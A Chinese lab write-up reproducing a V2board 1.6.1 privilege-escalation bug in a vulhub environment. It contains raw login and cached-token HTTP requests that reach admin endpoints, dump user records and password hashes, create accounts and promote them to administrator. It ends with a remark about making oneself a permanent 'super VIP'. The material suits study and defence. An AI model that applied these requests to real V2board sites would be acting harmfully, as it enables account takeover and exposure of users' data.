title: V2board-1.6.1-提权漏洞
content:
vulhub靶场文章：https://github.com/vulhub/vulhub/blob/master/v2board/1.6-privilege-escalation/README.zh-cn.md

PHP写的机场，就复现看看。

原理就是认证使用了缓存里的信息，但是没有做好鉴权，导致一般用户可以访问后台管理员的接口。

复现：

复现就是注册普通用户帐号，获取认证信息，使用认证信息访问管理员接口。

访问：http://IP:8080

先注册一个账号 123@123.com 12345678

之后通过curl发包获取认证信息：

curl -i -s -k -XPOST --data-binary "email=123%40123.com&password=12345678" http://192.168.0.110:8080/api/v1/passport/auth/login

返回：

{"data":{"token":"7a779e7eddb3fd2dbb1a3bed0d2d1ce6","auth_data":"MTIzQDEyMy5jb206JDJ5JDEwJDkwOWNHclp1VUFYdnlpb2V4ci5HRE9qNjRCRGtDMVh5NFIxWW9md3h6dzBnakV6emEueDFL"}}

其中auth_data就是认证信息

之后发送数据包将auth_data先写入缓存中

GET /api/v1/user/info HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Connection: close
Authorization: MTIzQDEyMy5jb206JDJ5JDEwJDkwOWNHclp1VUFYdnlpb2V4ci5HRE9qNjRCRGtDMVh5NFIxWW9md3h6dzBnakV6emEueDFL
Cache-Control: max-age=0

写入之后，就可以携带认证信息访问管理员接口了

访问用户列表：

GET /api/v1/admin/user/fetch HTTP/1.1
Host: 192.168.0.110:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

Authorization: MTIzQDEyMy5jb206JDJ5JDEwJDkwOWNHclp1VUFYdnlpb2V4ci5HRE9qNjRCRGtDMVh5NFIxWW9md3h6dzBnakV6emEueDFL

Cookie: CactiTimeZone=480; cacti_remembers=1%2C0%2Cc7ab9885d183ad82e761c346f4e17c24adc94f618954735af0853262e24d2c85; CactiDateTime=Thu Dec 15 2022 16:33:18 GMT+0800 (ä¸­å½æ åæ¶é´); _ga=GA1.1.224987215.1671427330; _ga_P1E9Z5LRRK=GS1.1.1671430011.2.0.1671430011.0.0.0
Connection: close

如图：

其中id=1的就是管理员账号信息

{"id":1,"invite_user_id":null,"telegram_id":null,"email":"admin@example.com","password":"$2y$10$EdVbYLXrgSJe0I01O3demOnmEPUOFui6S8URXudWHc9474ajEvf7.","password_algo":null,"password_salt":null,"balance":0,"discount":null,"commission_type":0,"commission_rate":null,"commission_balance":0,"t":0,"u":0,"d":0,"transfer_enable":0,"banned":0,"is_admin":1,"is_staff":0,"last_login_at":null,"last_login_ip":null,"uuid":"9a2fdbc7-b346-44f7-91a1-46d5da5612d8","group_id":null,"plan_id":null,"remind_expire":1,"remind_traffic":1,"token":"0f49a4e5e1d9384593d24e63ef751c66","remarks":null,"expired_at":0,"created_at":1671426966,"updated_at":1671426966,"total_used":0,"subscribe_url":"http:\/\/192.168.0.110:8080\/api\/v1\/client\/subscribe?token=0f49a4e5e1d9384593d24e63ef751c66"}

但是密码是加密的，上面的数据现在密码没有加盐，有源码可以尝试找一下加密函数。

尝试解密：

在ResetPassword.php中找到了所使用的加密函数：password_hash()

$user->password = password_hash($password, PASSWORD_DEFAULT);
$user->password_algo = null;

在php.net查找函数的使用：每次加密生成的密文不一样，第二个值默认是$2y$，写成PASSWORD_DEFAULT

刚刚通过接口发现密码的salt值为null，也就是默认

所以直接验证一下刚刚注册的密码：

<?php
//密码原文
$a='12345678';
$b=password_hash($a,PASSWORD_DEFAULT);
echo $b;

//通过接口返回的密码hash
$c="$2y$10$909cGrZuUAXvyioexr.GDOj64BDkC1Xy4R1Yofwxzw0gjEzza.x1K";

//随意测试密码hash
$d="$2y$10$sfdsfdsfdsfdsfdsfds.sdasdsadasdasdadsadsadasddasdasda";

//验证是否匹配
if (password_verify($a, $c)){
   echo "密码匹配"."\n";
}else{  
   echo "密码错误"."\n";
}

//输出hash值的信息
$e = password_get_info ($b);
var_dump($e);

?>

password_verify就是用来验证密码原文和hash值是否是匹配的，前面说了每次密码生成的 密文是不一样的。

找是找到了，但是这样除了爆破就没办法了。

其实本来想直接看看有没有接口添加管理员的，但是p牛的这个环境没给管理员密码。

爆破是想都不用想了，忘记密码显示可以进入容器重置密码

在站点目录下执行命令找回密码
php artisan reset:password 管理员邮箱

进入容器重置密码：

sudo docker ps
sudo docker exec -it xxxxxx /bin/bash
php artisan reset:password admin@example.com  #这个password是模块的意思
重置密码：05136632d72e03fa7b2829dc0aa3f0d8

修改账号权限：

登录管理员账号，再来找一找接口

用户添加接口：

POST /api/v1/admin/user/generate HTTP/1.1
Host: 192.168.0.110:8080
Content-Length: 55
authorization: YWRtaW5AZXhhbXBsZS5jb206JDJ5JDEwJEtnT2toLlJDdGpsMkhqYzl1MzBJSS5WR21mVm1EZGl0dDBoQ1N6Qjh0NEFRQ2RYSXdEL04u
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://192.168.0.110:8080
Referer: http://192.168.0.110:8080/admin
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: CactiTimeZone=480; cacti_remembers=1%2C0%2Cc7ab9885d183ad82e761c346f4e17c24adc94f618954735af0853262e24d2c85; CactiDateTime=Thu Dec 15 2022 16:33:18 GMT+0800 (ä¸­å½æ åæ¶é´); _ga=GA1.1.224987215.1671427330; dark_mode=0; _ga_P1E9Z5LRRK=GS1.1.1671432769.3.1.1671436123.0.0.0
Connection: close

email_prefix=a&email_suffix=admin.com&password=12345678

用户设置为管理员：

POST /api/v1/admin/user/update HTTP/1.1
Host: 192.168.0.110:8080
Content-Length: 458
authorization: YWRtaW5AZXhhbXBsZS5jb206JDJ5JDEwJEtnT2toLlJDdGpsMkhqYzl1MzBJSS5WR21mVm1EZGl0dDBoQ1N6Qjh0NEFRQ2RYSXdEL04u
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://192.168.0.110:8080
Referer: http://192.168.0.110:8080/admin
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: CactiTimeZone=480; cacti_remembers=1%2C0%2Cc7ab9885d183ad82e761c346f4e17c24adc94f618954735af0853262e24d2c85; CactiDateTime=Thu Dec 15 2022 16:33:18 GMT+0800 (ä¸­å½æ åæ¶é´); _ga=GA1.1.224987215.1671427330; dark_mode=0; _ga_P1E9Z5LRRK=GS1.1.1671432769.3.1.1671436123.0.0.0
Connection: close

id=4&invite_user_id=&telegram_id=&email=a%40admin.com&password=&password_algo=&password_salt=&balance=0&discount=&commission_type=0&commission_rate=&commission_balance=0&t=0&u=0&d=0&transfer_enable=0&banned=0&is_admin=1&is_staff=0&last_login_at=&last_login_ip=&uuid=a81a163c-cc6c-48d4-9189-ac4696eff82b&group_id=&plan_id=&remind_expire=1&remind_traffic=1&token=ae4d9b38b439c8d6c7c799dce821b78c&remarks=&expired_at=&created_at=1671436232&updated_at=1671436232

这么多参数，只需要修改用户id和email就可以了，在前面的用户列表可以获取到这些数据

接下来就来测试一下，用普通用户账号创建用户和管理员：

POST /api/v1/admin/user/generate HTTP/1.1
Host: 192.168.0.110:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Authorization: MTIzQDEyMy5jb206JDJ5JDEwJDkwOWNHclp1VUFYdnlpb2V4ci5HRE9qNjRCRGtDMVh5NFIxWW9md3h6dzBnakV6emEueDFL
Cookie: CactiTimeZone=480; cacti_remembers=1%2C0%2Cc7ab9885d183ad82e761c346f4e17c24adc94f618954735af0853262e24d2c85; CactiDateTime=Thu Dec 15 2022 16:33:18 GMT+0800 (ä¸­å½æ åæ¶é´); _ga=GA1.1.224987215.1671427330; _ga_P1E9Z5LRRK=GS1.1.1671430011.2.0.1671430011.0.0.0
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

email_prefix=6&email_suffix=admin.com&password=12345678

发包后返回true

刷新后台页面可以看到以及添加用户

当前权限

在获取用户id

GET /api/v1/admin/user/fetch HTTP/1.1
Host: 192.168.0.110:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

Authorization: MTIzQDEyMy5jb206JDJ5JDEwJDkwOWNHclp1VUFYdnlpb2V4ci5HRE9qNjRCRGtDMVh5NFIxWW9md3h6dzBnakV6emEueDFL

Cookie: CactiTimeZone=480; cacti_remembers=1%2C0%2Cc7ab9885d183ad82e761c346f4e17c24adc94f618954735af0853262e24d2c85; CactiDateTime=Thu Dec 15 2022 16:33:18 GMT+0800 (ä¸­å½æ åæ¶é´); _ga=GA1.1.224987215.1671427330; _ga_P1E9Z5LRRK=GS1.1.1671430011.2.0.1671430011.0.0.0
Connection: close

修改用户权限为管理员：

POST /api/v1/admin/user/update HTTP/1.1
Host: 192.168.0.110:8080
Content-Length: 458
authorization: NkBhZG1pbi5jb206JDJ5JDEwJEd3SzNxOS9ZUVo2RHYyRzlXek44Yy5xbTg3L0k4SkFzUDZGQmIybXhpTVpwZGU3SlZrazd5
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://192.168.0.110:8080
Referer: http://192.168.0.110:8080/admin
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: CactiTimeZone=480; cacti_remembers=1%2C0%2Cc7ab9885d183ad82e761c346f4e17c24adc94f618954735af0853262e24d2c85; CactiDateTime=Thu Dec 15 2022 16:33:18 GMT+0800 (ä¸­å½æ åæ¶é´); _ga=GA1.1.224987215.1671427330; dark_mode=0; _ga_P1E9Z5LRRK=GS1.1.1671432769.3.1.1671436123.0.0.0
Connection: close

id=5&invite_user_id=&telegram_id=&email=6%40admin.com&password=&password_algo=&password_salt=&balance=0&discount=&commission_type=0&commission_rate=&commission_balance=0&t=0&u=0&d=0&transfer_enable=0&banned=0&is_admin=1&is_staff=0&last_login_at=&last_login_ip=&uuid=a81a163c-cc6c-48d4-9189-ac4696eff82b&group_id=&plan_id=&remind_expire=1&remind_traffic=1&token=ae4d9b38b439c8d6c7c799dce821b78c&remarks=&expired_at=&created_at=1671436232&updated_at=1671436232

成功修改：

其实流程是，注册账号，获取认证信息，让认证信息进入缓存，访问用户列表接口获取id值，访问接口修改为管理员。

其中再次访问用户列表接口返回405，使用新账号的认证信息，再次测试还是返回405，有点小问题。多试几次应该就好了。

还有一个坑，这个后台路径是能修改的。虽然接口还是一样的，能获取管理员账号，但是没有路径就不能登陆后台为所欲为了。

所以还是找找其他接口把自己变成超级vip，长期有效的那种。这里就不看了。

关闭环境：

docker-compose down -v #关闭镜像 
docker images   #列出所有下载镜像 
docker rmi --force ID    #删除ID镜像
